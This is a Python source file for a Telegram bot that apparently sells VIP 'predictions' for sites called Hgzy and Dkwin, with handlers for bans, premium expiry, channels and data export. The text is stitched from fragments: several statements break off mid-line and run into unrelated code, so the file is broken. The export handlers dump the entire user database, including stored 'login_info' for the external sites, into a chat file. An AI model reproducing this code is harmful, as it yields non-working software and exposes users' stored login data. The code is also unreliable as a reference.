            await update.message.reply_text("❌ Invalid user ID. Please enter a valid numeric user ID.")
            return GET_UNBAN_USER_ID
        
        if user_id not in users:
            await update.message.reply_text("❌ User not found in database.")
            return GET_UNBAN_USER_ID
        
        if not users[user_id].get("banned", False):
            await update.message.reply_text("❌ User is not banned.")
            return GET_UNBAN_USER_ID
        
        # Remove banned flag from user
        users[
                parts.append(f"{hours}h")
            if minutes or not parts:
                parts.append(f"{minutes}m")
            return " ".join(parts)
        for uid, u in users.items():
            if not isinstance(u, dict):
                continue
            is_premium = u.get("is_premium", False)
            expiry_iso = u.get("premium_expiry")
            name = u.get("name", "Unknown")
            if is_premium:
                # auto-expire check
                self._auto_expire_if_needed(uid)
                is_premium = u.get("is_premium", False)
                expiry_iso = u.get("premium_expiry")
            if is_premium and expiry_iso:
                try:
                    expiry_dt = datetime.fromisoformat(expiry_iso)
                    remaining = expiry_dt - now
                    active_rows.append(f"`{uid}` — {escape_markdown(name, version=2)} — until `{expiry_iso}` `in {_fmt_remaining(remaining)}`")
                except Exception:
                    active_rows.append(f"`{uid}` — {escape_markdown(name, version=2)} — until `{expiry_iso}`")
            elif is_premium and not expiry_iso:
                active_rows.append(f"`{uid}` — {escape_markdown(name, version=2)} — no expiry set")
            else:
                # expired or not vip but had history
                expired_at = u.get("premium_expired_at") or u.get("premium_expiry")
                if expired_at:
                    expired_rows.append(f"`{uid}` — {escape_markdown(name, version=2)} — expired `{expired_at}`")

        active_text = "\n".join(active_rows) or "_None_"
        expired_text = "\n".join(expired_rows) or "_None_"
        msg = (
            "⭐ *VIP Users*\n\n"
            f"*Active:*\n{active_text}\n\n"
            f"*Expired:*\n{expired_text}"
        )
        await update.message.reply_text(msg, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def ban_user_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /banuser command"""
        user_id = str(update.effective_user.id)
        
        if 
            if not channel_id.startswith('-'):
                await update.message.reply_text("❌ Channel ID must start with '-' (e.g., -1001234567890)")
                return
            
            new_channel = {
                "name": name,
                "url": url,
                "id": int(channel_id)
            }
            
            channels.append(new_channel)
            save_db(channels, DB_CHANNELS)
            
            await update.message.reply_text(f"✅ Channel '{name}' added successfully!")
            
        elif action == "remove" and len(context.args) >= 2:
            channel_id = context.args[1]
            
            if not channel_id.startswith('-'):
                await update.message.reply_text("❌ Channel ID must start with '-'")
                return
            
            channel_id = int(channel_id)
            removed = False
            
            for 
            # Show current subscription settings
            subscription_caption = config.get("subscription_caption", "🌟 Premium Subscription")
            subscription_prices = config.get("subscription_prices", {
                "1_month": 10,
                "3_months": 25,
                "6_months": 45,
                "1_year": 80
            })
            
            
            return
        
        # Create user if not exists
        if user_id not in users:
            users[user_id] = {
                "name": update.effective_user.full_name, 
                "points": 0, 
                "is_premium": False,
                "referrals": 0, 
                "referrer": None, 
                "joined_channels": False,
                "logged_in": {"Hgzy": False, "Dkwin": False},
                "login_info": {"Hgzy": {}, "Dkwin": {}},
                "last_prediction": None, 
                "last_website": None,
                "banned": False,
            }
            save_db(users, DB_USERS)
        
        # Bypass channel subscription for testing
        users[user_id]["joined_channels"] = True
        save_db(users, DB_USERS)
        
        await update.message.reply_text("🧪 Test mode: Channel subscription bypassed!")
        await self.show_main_menu(update, context)

    # Helper methods for download command
    async def download_users_data(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Download users data"""
        try:
            import json
            from io import BytesIO
            
            # Create users data
            users_data = {
                "total_users": len(users),
                "vip_users": len([u for u in users.values() if u.get("is_premium", False)]),
                "banned_users": len([u for u in users.values() if u.get("is_banned", False)]),
                "users": users
            }
            
            # Create file
            file_data = json.dumps(users_data, indent=2, ensure_ascii=False)
            file_obj = BytesIO(file_data.encode('utf-8'))
            file_obj.name = f"users_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=file_obj,
                caption="📊 Users Data Export"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Download failed: {str(e)}")

    async def download_vip_data(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Download VIP users data"""
        try:
            import json
            from io import BytesIO
            
            vip_users = {uid: user for uid, user in users.items() if user.get("is_premium", False)}
            
            # Create VIP data
            vip_data = {
                "total_vip_users": len(vip_users),
                "vip_users": vip_users
            }
            
            # Create file
            file_data = json.dumps(vip_data, indent=2, ensure_ascii=False)
            file_obj = BytesIO(file_data.encode('utf-8'))
            file_obj.name = f"vip_users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=file_obj,
                caption="⭐ VIP Users Data Export"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Download failed: {str(e)}")

    async def download_admins_data(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Download admins data"""
        try:
            import json
            from io import BytesIO
            
            admin_users = config.get("admin_users", [])
            
            # Create admins data
            admins_data = {
                "total_admins": len(admin_users),
                "admin_users": admin_users
            }
            
            # Create file
            file_data = json.dumps(admins_data, indent=2, ensure_ascii=False)
            file_obj = BytesIO(file_data.encode('utf-8'))
            file_obj.name = f"admins_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=file_obj,
                caption="🔧 Admins Data Export"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Download failed: {str(e)}")

    async def download_predictions_data(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Download predictions data"""
        try:
            import json
            from io import BytesIO
            
            # Create predictions data
            predictions_data = {
                "total_predictions": len(predictions),
                "predictions": predictions
            }
            
            # Create file
            file_data = json.dumps(predictions_data, indent=2, ensure_ascii=False)
            file_obj = BytesIO(file_data.encode('utf-8'))
            file_obj.name = f"predictions_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=file_obj,
                caption="🎯 Predictions Data Export"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Download failed: {str(e)}")

    async def download_channels_data(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Download channels data"""
        try:
            import json
            from io import BytesIO
            
            # Create channels data
            channels_data = {
                "total_channels": len(channels),
                "channels": channels
            }
            
            # Create file
            file_data = json.dumps(channels_data, indent=2, ensure_ascii=False)
            file_obj = BytesIO(file_data.encode('utf-8'))
            file_obj.name = f"channels_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=file_obj,
                caption="📢 Channels Data Export"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ Download failed: {str(e)}")

    def run(self):
        logger.info("Bot is starting...")
        try:
            self.application.run_polling()
        except NetworkError as e:
            logger.critical(f"NETWORK ERROR: {e}. Bot could not connect to Telegram servers. Check your internet connection and DNS settings.")
        except Exception as e:
            logger.critical(f"An unexpected error occurred: {e}", exc_info=True)

    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /cancel command - manually cancel any active conversation"""
        user_id = str(update.effective_user.id)
        
        # Clear any conversation data
        if hasattr(context, 'user_data'):
            context.user_data.clear()
        
        # Send cancellation message
        await update.message.reply_text(
            "🔄 All active sessions cancelled.\n"
            "You can now use any command normally."
        )
        
        # Show main menu
        await self.show_main_menu(update, context)

if __name__ == "__main__":
    bot = TelegramBot(config["bot_token"])
    bot.run()